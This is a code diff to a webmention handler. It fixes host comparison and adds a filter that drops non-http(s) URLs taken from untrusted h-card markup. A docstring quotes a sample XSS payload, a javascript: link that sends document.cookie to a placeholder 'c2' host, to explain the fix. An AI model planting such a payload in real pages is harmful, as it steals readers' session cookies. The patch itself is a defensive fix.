@@ -87,15 +87,19 @@ def is_external(url: str, our_host: str) -> bool:
     """True when `url` points to a host other than `our_host`.
 
     Same-host links don't generate webmentions (a site doesn't
-    mention itself). Comparison is case-insensitive on host.
+    mention itself). Comparison is on `hostname`, not `netloc`:
+    `netloc` includes port and userinfo, so an explicit port on
+    one side (`example.com:443`) would never match a hostname
+    derived from `Site.hostname` (no port). Comparison is
+    case-insensitive.
     """
     try:
         parsed = urlparse(url)
     except ValueError:
         return False
-    if not parsed.scheme or not parsed.netloc:
+    if not parsed.scheme or not parsed.hostname:
         return False
-    return parsed.netloc.lower() != (our_host or "").lower()
+    return parsed.hostname.lower() != (our_host or "").lower()
 
 
 def find_endpoint(
@@ -154,15 +158,46 @@ def extract_hcard(html: str, base_url: str) -> tuple[str | None, str | None, str
     class="h-card" href="...">Name</a>` plus optional
     `<img class="u-photo" src="...">`); the full mf2 spec needs
     a real parser.
+
+    `author_url` and `author_photo` are gated through `_safe_external_url`
+    so an attacker-controlled source page that advertises an
+    `<a class="h-card" href="javascript:fetch('//c2/'+document.cookie)">`
+    can't smuggle a `javascript:` URL into `Webmention.author_url`.
+    Once a moderator approves the row, that URL renders as an
+    `<a href>` on the public post; clicking it would execute
+    attacker JS in the delivery origin (where a logged-in reader's
+    session cookies live). The admin moderation list shows the URL
+    as truncated plain text, so a moderator can't easily preview
+    the trap. Gate at extraction time so this is a one-line
+    defence rather than a render-time concern.
     """
     match = _HCARD_RE.search(html)
     if match is None:
         return (None, None, None)
     name = (match.group("name") or "").strip() or None
-    url = urljoin(base_url, match.group("url")) if match.group("url") else None
+    url = _safe_external_url(urljoin(base_url, match.group("url"))) if match.group("url") else None
     photo_match = _U_PHOTO_RE.search(html)
-    photo = urljoin(base_url, photo_match.group("url")) if photo_match else None
+    photo = _safe_external_url(urljoin(base_url, photo_match.group("url"))) if photo_match else None
     return (name, url, photo)
+
+
+def _safe_external_url(url: str | None) -> str | None:
+    """Return `url` iff its scheme is http(s); else None.
+
+    Rejects `javascript:`, `data:`, `file:`, `gopher:`, bare
+    `//host/...` (treated as ParseResult with empty scheme by
+    Python's urlparse but is also rejected because no scheme),
+    etc. Used to gate any URL extracted from attacker-controlled
+    HTML before it lands in the DB.
+    """
+    if not url:
+        return None
+    parsed = urlparse(url)
+    if parsed.scheme.lower() not in {"http", "https"}:
+        return None
+    if not parsed.hostname:
+        return None
+    return url
 
 
 def classify_mention(html: str) -> str:
